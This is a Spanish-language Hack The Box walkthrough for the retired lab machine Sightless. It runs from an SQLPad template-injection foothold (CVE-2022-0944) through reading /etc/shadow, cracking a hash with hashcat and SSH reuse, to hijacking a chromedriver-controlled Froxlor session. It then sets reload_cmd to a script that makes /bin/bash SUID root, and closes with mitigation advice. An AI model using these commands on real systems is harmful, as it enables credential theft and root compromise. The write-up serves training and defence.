---
machine: Sightless
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, sqlpad, cve-2022-0944, ssti, chromedriver, froxlor]
---

# Sightless — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

SQLPad 6.10.0 es vulnerable a CVE-2022-0944, una SSTI de Nunjucks en `/api/test-connection`. La ejecución en el contenedor filtra `/etc/shadow`; la contraseña de `michael` se reutiliza por SSH. Un `chromedriver` local permite secuestrar la sesión de Froxlor y abusar de `reload_cmd` para obtener root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p21,22,80 <IP>
```

- ProFTPD, OpenSSH y nginx.
- `sightless.htb` es una landing estática.
- La enumeración de vhosts descubre `sqlpad.sightless.htb` y `admin.sightless.htb`.

## Enumeración

- SQLPad muestra la versión 6.10.0.
- `/api/test-connection` acepta JSON sin autenticación.
- El driver `trino` pasa el campo `data.host` al motor de plantillas Nunjucks.

## Foothold

Se inyecta una expresión Nunjucks que llama a `child_process.exec`. La petición devuelve error o queda colgada, pero la reverse shell llega como root dentro del contenedor.

```bash
curl -s -X POST http://sqlpad.sightless.htb/api/test-connection \
  -H 'Content-Type: application/json' --data @ssti.json
```

Desde el contenedor se lee `/etc/shadow`; el hash SHA-512 de `michael` se crackea con `hashcat -m 1800`. La misma contraseña permite SSH al host.

```bash
cat /etc/shadow
hashcat -m 1800 michael.hash /usr/share/wordlists/rockyou.txt
ssh michael@sightless.htb
```

## Escalada de privilegios

`ps aux` revela un `chromedriver --port=<PORT>` que controla una sesión autenticada de Froxlor. Se reenvía el puerto y se usa WebDriver para ejecutar JavaScript en la pestaña activa.

```bash
ps aux | grep chromedriver
ssh -L <PORT>:127.0.0.1:<PORT> michael@sightless.htb -N
```

Con la sesión de administrador se edita el demonio PHP-FPM y se establece `reload_cmd` a un script propio. El cron de Froxlor lo ejecuta como root.

```bash
printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /tmp/pwn.sh
chmod +x /tmp/pwn.sh
# En Froxlor: reload_cmd = /tmp/pwn.sh
/bin/bash -p
```

## Evidencia

- Petición SSTI y respuesta de `id` en el contenedor.
- Hash de `michael` y acceso SSH, con contraseña redactada.
- Proceso `chromedriver` y túnel SSH.
- `reload_cmd` y binario SUID.
- Flag redactada.

## Lecciones aprendidas

- Una SSTI en un campo aparentemente de conexión puede ejecutar comandos.
- `/etc/shadow` de un contenedor puede contener credenciales reutilizadas en el host.
- Un navegador headless con sesión iniciada es una superficie de administración completa.

## Mitigaciones y detección

- Actualizar SQLPad y autenticar `/api/test-connection`.
- Aislar credenciales entre contenedores y host.
- No exponer `chromedriver` sin autenticación y limitar el acceso local.
- Validar `reload_cmd` y ejecutar los servicios de panel con privilegios mínimos.

## Referencias

- <https://www.hackthebox.com/machines/Sightless>
- <https://github.com/advisories/GHSA-p7gv-hw3c-jxj4>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-0944>
- <https://attack.mitre.org/techniques/T1190/>
